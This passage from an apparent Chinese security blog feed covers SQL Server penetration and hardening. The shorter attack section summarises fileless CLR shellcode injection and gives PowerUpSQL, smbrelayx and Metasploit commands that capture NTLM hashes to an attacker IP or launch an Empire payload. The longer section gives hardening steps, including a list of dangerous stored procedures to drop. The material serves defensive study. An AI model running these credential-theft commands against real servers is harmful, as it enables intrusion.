class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1</span><br><span class="line">Get-SQLServerPasswordHash -Verbose -Instance &#39;SQLServerName\InstanceName&#39; -</span><br><span class="line">Migrate</span><br></pre></td></tr></table></figure><h3 id="CLR实现无文件落地横向移动"><a href="#CLR实现无文件落地横向移动" class="headerlink" title="CLR实现无文件落地横向移动"></a>CLR实现无文件落地横向移动</h3><p><a href="https://research.nccgroup.com/author/dcashncc/">David Cash</a>在<a href="https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/">MSSQL Lateral Movement</a>介绍了SQL Server中使用CLR自动执行横向移动而无文件落地和不需要xp_cmdshell，以及如何防止被检测到。</p><p>CLR相关的介绍在上文已经介绍，在此不再赘述。通常为实现命令执行而对MSSQL服务进行后期开发通 常会利用XP_CMDSHELL存储过程在MSSQL进程的上下文中运行操作系统命令。要使用此技术运行自定义代码，通常需要使用LOLBINS，添加新的操作系统用户或通过BCP写入磁盘的二进制文件，这提供了明显的检测机会。</p><p>SQL Server服务进程可以执行提供给它的任何.NET代码，因此利用.NET代码进行横向移动，仅需要构建 适当的DLL。作为概念的证明，为了生成了一个简单的程序集，该程序集对一些shellcode进行XOR并将 其注入到生成的进程中。使用<a href="https://github.com/nccgroup/nccfsas/tree/main/Tools/Squeak">Squeak</a>可以简化CLR代码的创建和调用，下面是Squeak具备的一些功能：</p><ul><li>展示连接数据</li><li>从原始二进制文件和单字节XOR读取shellcode字节</li><li>生成一个MSSQL CLR DLL，该DLL对shellcode进行XOR，生成一个新进程，然后将shellcode注入其中。</li><li>计算DLL的SHA512哈希</li><li>生成带有硬编码参数的单个.NET可执行文件，以通过SQL连接执行DLL,该可执行文件执行以下操作：<ul><li>创建一个SQL连接 </li><li>检查SQL Server版本</li><li>检查DBA权限</li><li>检查并记录现有的安全设置</li><li>修改安全设置</li><li>创建并运行程序集</li><li>恢复安全设置并删除程序集</li></ul></li></ul><p>使用<a href="https://github.com/nccgroup/nccfsas/tree/main/Tools/Squeak">Squeak</a>可以生成带有连接字符串和CLR程序集的独立可执行文件。CLR程序集的代码是从本地目录中的文件中加载，可以直接打开文件，也可以在工具中对其进行编辑。</p><h3 id="UNC路径注入"><a href="#UNC路径注入" class="headerlink" title="UNC路径注入"></a>UNC路径注入</h3><p>UNC用于访问远程文件服务器，格式为\ip\file，如果我们可以执行这个功能，则可以强制SQL Server向<br>我们进行身份验证，并且可以获得SQL Server服务帐号的NTLM密码哈希。</p><h4 id="可以通过以下方式实现自动化："><a href="#可以通过以下方式实现自动化：" class="headerlink" title="可以通过以下方式实现自动化："></a>可以通过以下方式实现自动化：</h4><ul><li>PowerUpSQL的Get-SQLServiceAccountPwHashes脚本</li><li>SQL NTLM Hash：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUpSQL.ps1&#96;</span><br><span class="line">Import-Module C:\PowerUpSQL-master\Scripts\3rdparty\Inveigh.ps1</span><br><span class="line">Import-Module C:\PowerUpSQL-master\Scripts\pending\Get-</span><br><span class="line">SQLServiceAccountPwHashes.ps1</span><br><span class="line">Get-SQLServiceAccountPwHashes -Verbose -TimeOut 20 -CaptureIp</span><br><span class="line">attacker_controlled_ip</span><br></pre></td></tr></table></figure></li><li>使用smbrelayx（impacket）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbrelayx.py -h sqlserverIP -c &#39;powershell empire launcher&#39;</span><br></pre></td></tr></table></figure></li><li>metasploit的SQL NTLM Hash：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary&#x2F;admin&#x2F;mssql&#x2F;mssql_ntlm_stealer</span><br><span class="line">set SMBPROXY attackerIP</span><br><span class="line">set RHOST webappwithsqliIP</span><br><span class="line">set GET_PATH pathtosqli</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="防守方如何应对"><a href="#防守方如何应对" class="headerlink" title="防守方如何应对"></a>防守方如何应对</h1><h2 id="账号管理"><a href="#账号管理" class="headerlink" title="账号管理"></a>账号管理</h2><h4 id="查询目前所有用户列表"><a href="#查询目前所有用户列表" class="headerlink" title="查询目前所有用户列表"></a>查询目前所有用户列表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name,password from syslogins order by name</span><br></pre></td></tr></table></figure><p><img src="/images/image99.png"></p><h4 id="为不同的管理员分配不同的账号"><a href="#为不同的管理员分配不同的账号" class="headerlink" title="为不同的管理员分配不同的账号"></a>为不同的管理员分配不同的账号</h4><p>按照使用目的进行分配账号，避免不同用户间共享账号，提高安全性。或在企业管理器中直接添加远程<br>登陆用户建立角色，并给角色授权，把角色赋给不同的用户或修改用户属性中的角色和权限。<br>添加不同用户，参考配置操作:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sp_addlogin &#39;user1&#39;,&#39;password1&#39;</span><br><span class="line">sp_addlogin &#39;user2&#39;,&#39;password2&#39;</span><br></pre></td></tr></table></figure><h4 id="删除或锁定无效账号"><a href="#删除或锁定无效账号" class="headerlink" title="删除或锁定无效账号"></a>删除或锁定无效账号</h4><p>删除冗余的系统默认账号，减少系统安全隐患，参考配置操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft SQL Server Management Studio -&gt; SQL Server -&gt; 安全性 -&gt; 登录名 -&gt; 选择要 删除的用户名(右键)</span><br></pre></td></tr></table></figure><p><img src="/images/image100.png"></p><h4 id="限制启动账号权限"><a href="#限制启动账号权限" class="headerlink" title="限制启动账号权限"></a>限制启动账号权限</h4><p>启动mssql的用户权限过高，会导致其子进程具有相同权限，参考配置操作:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft SQL Server Management Studio -&gt; SQL Server -&gt;属性(右键) -&gt; 安全性</span><br></pre></td></tr></table></figure><p>新建SQL server服务账号后，建议将其从User组中删除，且不要把该账号提升为Administrators组的成 员，授予以账户最少启动权限。</p><p><img src="/images/image101.png"></p><hr><h2 id="认证授权"><a href="#认证授权" class="headerlink" title="认证授权"></a>认证授权</h2><h4 id="权限最小化"><a href="#权限最小化" class="headerlink" title="权限最小化"></a>权限最小化</h4><p>在数据库权限配置能力内，根据用户的业务需要，配置其所需的最小权限，参考配置操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft SQL Server Management Studio -&gt; SQL Server -&gt; 属性(右键) -&gt; 安全性</span><br></pre></td></tr></table></figure><p><img src="/images/image102.png"></p><h4 id="数据库角色"><a href="#数据库角色" class="headerlink" title="数据库角色"></a>数据库角色</h4><p>使用数据库角色（ROLE）来管理对象的权限，参考配置操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft SQL Server Management Studio -&gt; SQL Server -&gt; 安全性 -&gt; 服务器角色(右 键)-&gt; 新服务器角色</span><br></pre></td></tr></table></figure><p>调整角色属性中的权限，赋予角色中拥有对象对应的SELECT、INSERT、UPDATE、DELETE、EXEC、 DRI权限</p><p><img src="/images/image103.png"></p><h4 id="是否存在空密码用户"><a href="#是否存在空密码用户" class="headerlink" title="是否存在空密码用户"></a>是否存在空密码用户</h4><p>对所有账户的属性进行审计，包括空密码、密码更新时间等。修改目前所有账号的口令，确认为强口令。特别是sa账号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from sysusers</span><br><span class="line">select name,Password from syslogins where password is null order by name # 查看 口令为空的用户</span><br></pre></td></tr></table></figure><p><img src="/images/image104.png"></p><p>使用sp_password更新用户密码，特别是sa 账号，需要设置至少10位的强口令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_password &#39;old_passwd&#39;, &#39;new_passwd&#39;, sa</span><br></pre></td></tr></table></figure><h4 id="锁定特权"><a href="#锁定特权" class="headerlink" title="锁定特权"></a>锁定特权</h4><p>默认情况下，SQL Server安装会在模型数据库之外的所有数据库中授予guest帐户公共角色成员身份。 建议在Windows中禁用guest帐户，并撤消其对除master和tempdb之外的所有数据库的访问权限。参 考配置操作，使用以下命令删除数据库访问权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use msdb;</span><br><span class="line">exec sp_revokedbaccess guest;</span><br></pre></td></tr></table></figure><p><img src="/images/image105.png"></p><p>Public不应访问Web任务表，因为它们可以使表数据可供Web客户端使用。 特权应被撤销:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">revoke update on mswebtasks to public</span><br><span class="line">revoke insert on mswebtasks to public</span><br></pre></td></tr></table></figure><p>Microsoft数据转换服务(DTS)程序包是一组COM接口，可用于在SQL Server上使用以下命令执行许 多管理任务:T-SQL，Windows脚本和可执行工具。 默认情况下，企业管理器用户可以访问可用DTS软 件包列表。过程sp_enum_ dtspackages将显示可以输入到sp_get_dtspackage中的软件包名称和ID 号，这将返回软件包数据。 然后，攻击者可能会将程序包放入他的SQL Server本地安装中，并查看程序 包详细信息，其中通常包含其他服务器的凭据。 这些程序的特权应被删除:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">revoke execute on sp_enum_dtspackages to public</span><br><span class="line">revoke execute on sp_get_dtspackage to public</span><br></pre></td></tr></table></figure><p>sp_get_SQLAgent_properties存储过程，用于显示SQL Server代理服务连接到数据库服务器的混淆密码。使用此工具<a href="http://jimmers.narod.ru/agent_pwd.c">http://jimmers.narod.ru/agent_pwd.c</a>可以解混淆。<br>应删除此程序的权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">revoke execute on sp_get_SQLAgent_properties to public</span><br></pre></td></tr></table></figure><p>Microsoft数据转换服务(DTS)用于处理来自多个源(例如OLE DB，ODBC或文本文件)的数据。 连接密码以明文形式保存在Col11120列的表RTblDBMProps中，因此任何具有选择特权的人都可以检索 到。使用以下命令锁定此表的权限:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">revoke select on RTblDBMProps to public</span><br><span class="line">revoke update on RTblDBMProps to public</span><br><span class="line">revoke insert on RTblDBMProps to public</span><br><span class="line">revoke delete on RTblDBMProps to public</span><br></pre></td></tr></table></figure><hr><h2 id="配置日志审计"><a href="#配置日志审计" class="headerlink" title="配置日志审计"></a>配置日志审计</h2><h4 id="开启日志审计功能"><a href="#开启日志审计功能" class="headerlink" title="开启日志审计功能"></a>开启日志审计功能</h4><p>数据库应配置日志功能，对用户登录进行审计，日志内容包括用户登录使用的账号、登录是否成功、登<br>录时间等。<br>打开数据库属性，查看安全性，将服务器身份验证调整为“SQL Server 和Windows身份验证模式” ，安全 性中的登录审核调整为“失败和成功的登录”。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft SQL Server Management Studio -&gt; SQL Server(右键) -&gt; 属性 -&gt; 安全性</span><br></pre></td></tr></table></figure><p><img src="/images/image106.png"></p><p>或者通过将以下注册表值设置为2（将其设置为3还将记录成功的登录）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSSQLServer\MSSQLServer\AuditLevel</span><br></pre></td></tr></table></figure><hr><h2 id="配置网络通信协议"><a href="#配置网络通信协议" class="headerlink" title="配置网络通信协议"></a>配置网络通信协议</h2><h4 id="禁用不必要的网络服务"><a href="#禁用不必要的网络服务" class="headerlink" title="禁用不必要的网络服务"></a>禁用不必要的网络服务</h4><p>SQL Server使用的网络通信协议应限制为最小基础架构所需。禁用SQL Server运行冗余服务。启用陌 生的网络通信协议，可能增加数据库网络风险。TCP/IP是最常用的用于SQL Server的网络协议栈，它与SSL一起为访问SQL Server提供安全的基础。<br>Microsoft SQL Server程序组, 运行服务网络实用工具。建议只使用TCP/IP协议，禁用其他协议。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL Server Configuration Manager -&gt; SQL Server网络配置 -&gt; MSSQLSERVER的协议</span><br></pre></td></tr></table></figure><p><img src="/images/image107.jpeg"></p><h4 id="加固TCP-IP协议栈"><a href="#加固TCP-IP协议栈" class="headerlink" title="加固TCP/IP协议栈"></a>加固TCP/IP协议栈</h4><p>查看注册表键值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\DisableIPSourceRouting</span><br><span class="line">HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\EnableICMPRedirect</span><br><span class="line">HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\SynAttackProtect</span><br></pre></td></tr></table></figure><p>参考配置操作<br>对于TCP/IP协议栈的加固主要是某些注册表键值的修改。主要是以下几个:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\DisableIPSourceRouting # 说明:该键值应设为2，以防御源路由欺骗攻击。 HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\EnableICMPRedirect #说 明:该键值应设为0，以ICMP重定向。 HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\SynAttackProtect #说明:该 键值应设为2，防御SYN FLOOD攻击。</span><br></pre></td></tr></table></figure><h4 id="使用加密通讯协议"><a href="#使用加密通讯协议" class="headerlink" title="使用加密通讯协议"></a>使用加密通讯协议</h4><p>启动SQL Server配置工具，启用”强制协议加密”。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL Server Configuration Manager -&gt; SQL Server网络配置 -&gt; MSSQLSERVER的协议(右键) -&gt; 属性</span><br></pre></td></tr></table></figure><p><img src="/images/image108.png"></p><hr><h2 id="删除不必要的存储过程"><a href="#删除不必要的存储过程" class="headerlink" title="删除不必要的存储过程"></a>删除不必要的存储过程</h2><p>查询已有的所有的存储过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from sysobjects where xtype&#x3D;&#39;P&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image109.png"><br>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft SQL Server Management Studio -&gt; SQL Server -&gt; 数据库 -&gt; 系统数据库 -&gt; master(举例)-&gt; 可编程性 -&gt; 存储过程&#x2F;扩展存储过程 -&gt; 系统存储过程&#x2F;系统扩展存储过程</span><br></pre></td></tr></table></figure><p><img src="/images/image110.png"></p><p>删除SQL Server中存在的危险存储过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">exec sp_dropextendedproc &#39;xp_cmdshell&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;xp_dirtree&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;xp_enumgroups&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;xp_fixeddrives&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;xp_loginconfig&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;xp_enumerrorlogs&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;xp_getfiledetails&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Sp_OACreate&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Sp_OADestroy&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Sp_OAGetErrorInfo&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Sp_OAGetProperty&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Sp_OAMethod&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Sp_OASetProperty&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Sp_OAStop&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Xp_regaddmultistring&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Xp_regdeletekey&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Xp_regdeletevalue&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Xp_regenumvalues&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Xp_regread&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Xp_regremovemultistring&#39;</span><br><span class="line">exec sp_dropextendedproc &#39;Xp_regwrite&#39;</span><br><span class="line">drop procedure sp_makewebtask</span><br></pre></td></tr></table></figure><p>删除不必要的存储过程，一般情况下建议删除的存储过程有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sp_OACreate</span><br><span class="line">sp_OADestroy</span><br><span class="line">sp_OAGetErrorInfo</span><br><span class="line">sp_OAGetProperty</span><br><span class="line">sp_OAMethod</span><br><span class="line">sp_OASetProperty</span><br><span class="line">sp_OAStop</span><br><span class="line">sp_regaddmultistring</span><br><span class="line">xp_regdeletekey</span><br><span class="line">xp_regdeletevalue</span><br><span class="line">xp_regenumvalues</span><br><span class="line">xp_regremovemultistring</span><br></pre></td></tr></table></figure><p>不是应用程序必须使用时，建议删除以下存储过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">xp_perfend</span><br><span class="line">xp_perfmonitor</span><br><span class="line">xp_perfsample</span><br><span class="line">xp_perfstart</span><br><span class="line">xp_readerrorlog</span><br><span class="line">xp_readmail</span><br><span class="line">xp_revokelogin</span><br><span class="line">xp_runwebtask</span><br><span class="line">xp_schedulersignal</span><br><span class="line">xp_sendmail</span><br><span class="line">xp_servicecontrol</span><br><span class="line">xp_snmp_getstate</span><br><span class="line">xp_snmp_raisetrap</span><br><span class="line">xp_sprintf</span><br><span class="line">xp_sqlinventory</span><br><span class="line">xp_sqlregister</span><br><span class="line">xp_sqltrace</span><br><span class="line">xp_sscanf</span><br><span class="line">xp_startmail</span><br><span class="line">xp_stopmail</span><br><span class="line">xp_subdirs</span><br><span class="line">xp_unc_to_drive</span><br><span class="line">xp_dirtree</span><br><span class="line">xp_sdidebug</span><br><span class="line">xp_availablemedia</span><br><span class="line">xp_cmdshell</span><br><span class="line">xp_deletemail</span><br><span class="line">xp_dirtree</span><br><span class="line">xp_dropwebtask</span><br><span class="line">xp_dsninfo</span><br><span class="line">xp_enumdsn</span><br><span class="line">xp_enumerrorlogs</span><br><span class="line">xp_enumgroups</span><br><span class="line">xp_enumqueuedtasks</span><br><span class="line">xp_eventlog</span><br><span class="line">xp_findnextmsg</span><br><span class="line">xp_fixeddrives</span><br><span class="line">xp_getfiledetails</span><br><span class="line">xp_getnetname</span><br><span class="line">xp_grantlogin</span><br><span class="line">xp_logevent</span><br><span class="line">xp_loginconfig</span><br><span class="line">xp_logininfo</span><br><span class="line">xp_makewebtask</span><br><span class="line">xp_msver</span><br></pre></td></tr></table></figure><hr><h2 id="删除不必要的功能和服务"><a href="#删除不必要的功能和服务" class="headerlink" title="删除不必要的功能和服务"></a>删除不必要的功能和服务</h2><p>SQL Server的远程访问功能，允许网络上的其他SQL Server远程连接并执行存储过程。如果不需要此功能，则应使用以下命令禁用该功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">execute sp_configure &#39;remote access&#39;, &#39;0&#39;</span><br><span class="line">go</span><br><span class="line">reconfigure with override</span><br><span class="line">go</span><br></pre></td></tr></table></figure><p>或者使用Microsoft SQL Server Management Studio</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft SQL Server Management Studio -&gt; SQL Server(右键) -&gt; 属性 -&gt; 连接</span><br></pre></td></tr></table></figure><p><img src="/images/image112.png"></p><p>配置选项“允许更新”定义数据库用户是否可以直接更新系统表。这对于高级管理员来说可能是有用的临时功能，但对于正常操作，应该将其禁用:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">execute sp_configure &#39;allow updates&#39;, &#39;0&#39;</span><br><span class="line">go</span><br><span class="line">reconfigure with override</span><br><span class="line">go</span><br></pre></td></tr></table></figure><p>SQL Server Monitor，它侦听UDP端口1434并提供客户端不应访问有关服务器上存在的实例的信息，并且SQL Server将在其被阻止的情况下运行。防火墙或应阻止来自TCP端口1433和UDP端口1434的外部 通信。异构查询或临时查询允许数据库用户使用本地数据在远程服务器上执行查询。该功能可能被滥用以强制使用远程或本地访问凭据，应在不需要此功能时，将其禁用:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec xp_regwrite N&#39;HKEY_LOCAL_MACHINE&#39;,</span><br><span class="line">N&#39;SOFTWARE\Microsoft\MSSQLServer\Providers\SQLOLEDB&#39;, N&#39;DisallowAdhocAccess&#39;,</span><br><span class="line">N&#39;REG_DWORD&#39;, 1</span><br></pre></td></tr></table></figure><p>如果不需要，则应禁用SQL Server代理，Microsoft分布式事务处理协调器(MSDTC)和MSSearch服务。可以使用企业管理器或通过在Windows Services管理工具中将其启动类型设置为“停止”来关闭服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft SQL Server Management Studio -&gt; SQL Server -&gt; 管理</span><br></pre></td></tr></table></figure><p><img src="/images/image113.png"></p><p>或者设置注册表值禁用服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exec sp_set_sqlagent_properties @auto_start&#x3D;0</span><br><span class="line">exec xp_regwrite N&#39;HKEY_LOCAL_MACHINE&#39;,</span><br><span class="line">N&#39;SYSTEM\CurrentControlSet\Services\MSDTC&#39;, N&#39;Start&#39;, N&#39;REG_DWORD&#39;, 3</span><br><span class="line">exec xp_regwrite N&#39;HKEY_LOCAL_MACHINE&#39;,</span><br><span class="line">N&#39;SYSTEM\CurrentControlSet\Services\MSSEARCH&#39;, N&#39;Start&#39;, N&#39;REG_DWORD&#39;, 3</span><br></pre></td></tr></table></figure><p>进行这些更改后，应手动停止服务或重新启动服务器。</p><hr><h2 id="安装补丁"><a href="#安装补丁" class="headerlink" title="安装补丁"></a>安装补丁</h2><p>最后的步骤是确保应用最新的服务包和补丁程序。将显示SQL Server的当前版本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@version</span><br></pre></td></tr></table></figure><p><img src="/images/image114.png"></p><hr><h2 id="实战工具"><a href="#实战工具" class="headerlink" title="实战工具"></a>实战工具</h2><p><a href="https://github.com/SafeGroceryStore/MDUT">MDUT</a></p><hr><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/uENvpPan7aVd7MbSoAT9Dg">https://mp.weixin.qq.com/s/uENvpPan7aVd7MbSoAT9Dg</a></p><p><a href="https://www.quackit.com/sql_server/tutorial/sql_server_dts.cfm">https://www.quackit.com/sql_server/tutorial/sql_server_dts.cfm</a></p><p><a href="http://www.freetds.org/">http://www.freetds.org/</a></p><p><a href="http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html">http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html</a></p><p><a href="https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/">https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/</a></p><p><a href="https://xz.aliyun.com/t/7534">https://xz.aliyun.com/t/7534</a></p><p><a href="https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit">https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit</a></p><p><a href="https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration">https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration</a></p><p><a href="https://h4ms1k.github.io/Red_Team_MSSQL_Server/#">https://h4ms1k.github.io/Red_Team_MSSQL_Server/#</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/154">https://security.tencent.com/index.php/blog/msg/154</a></p><p><a href="https://www.freebuf.com/articles/es/262903.html">https://www.freebuf.com/articles/es/262903.html</a></p><p><a href="https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8">https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8</a></p><p><a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a> </p><p><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a> </p><p><a href="https://github.com/nccgroup/nccfsas">https://github.com/nccgroup/nccfsas</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SQL-Server数据库安全&quot;&gt;&lt;a href=&quot;#SQL-Server数据库安全&quot; class=&quot;headerlink&quot; title=&quot;SQL Server数据库安全&quot;&gt;&lt;/a&gt;SQL Server数据库安全&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="SQL Server" scheme="https://kb-at-zero.github.io/categories/SQL-Server/"/>
    
    
    <category term="渗透测试" scheme="https://kb-at-zero.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="SQL Server" scheme="https://kb-at-zero.github.io/tags/SQL-Server/"/>
    
    <category term="攻防演练" scheme="https://kb-at-zero.github.io/tags/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/"/>
    
    <category term="提权" scheme="https://kb-at-zero.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Web安全-Mysql注入</title>
    <link href="https://kb-at-zero.github.io/2021/04/20/Web%E5%AE%89%E5%85%A8-Mysql%E6%B3%A8%E5%85%A5/"/>
    <id>https://kb-at-zero.github.io/2021/04/20/Web%E5%AE%89%E5%85%A8-Mysql%E6%B3%A8%E5%85%A5/</id>
    <published>2021-04-20T04:42:34.000Z</published>
    <updated>2021-04-20T12:49:37.520Z</updated>
    
